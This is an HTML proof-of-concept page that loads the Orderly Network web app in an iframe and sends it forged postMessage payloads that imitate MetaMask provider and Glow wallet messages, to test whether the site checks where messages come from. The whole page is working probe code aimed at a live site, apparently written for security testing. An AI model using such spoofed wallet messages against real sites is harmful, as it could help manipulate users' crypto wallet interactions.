<!DOCTYPE html>
<html>
<head>
    <title>Orderly Network Message Injection Test</title>
</head>
<body>
    <h1>Cross-Origin Message Injection PoC</h1>
    <button onclick="testMetaMaskInjection()">Test MetaMask Message</button>
    <button onclick="testGlowInjection()">Test Glow Message</button>
    <button onclick="openOrderlyInIframe()">Open Orderly in iframe</button>
    
    <div id="log"></div>
    <iframe id="target" style="width:100%; height:500px;"></iframe>

    <script>
        const log = (msg) => {
            document.getElementById('log').innerHTML += `<p>${msg}</p>`;
            console.log(msg);
        };

        // Test 1: MetaMask provider injection
        function testMetaMaskInjection() {
            const targetWindow = document.getElementById('target').contentWindow;
            
            const payload = {
                target: "metamask-inpage",
                data: {
                    name: "metamask-provider",
                    data: {
                        id: Math.floor(Math.random() * 1000000), // Random ID
                        error: false
                    }
                }
            };
            
            log(`Sending MetaMask message: ${JSON.stringify(payload)}`);
            targetWindow.postMessage(payload, '*');
        }

        // Test 2: Glow wallet injection
        function testGlowInjection() {
            const targetWindow = document.getElementById('target').contentWindow;
            
            const payload = {
                __glow_loaded: true
            };
            
            log(`Sending Glow message: ${JSON.stringify(payload)}`);
            targetWindow.postMessage(payload, '*');
        }

        // Open Orderly in iframe
        function openOrderlyInIframe() {
            document.getElementById('target').src = 'https://app.orderly.network';
            log('Loaded Orderly in iframe');
        }

        // Listen for any messages back
        window.addEventListener('message', (event) => {
            log(`Received message from ${event.origin}: ${JSON.stringify(event.data)}`);
        });
    </script>
</body>
</html>
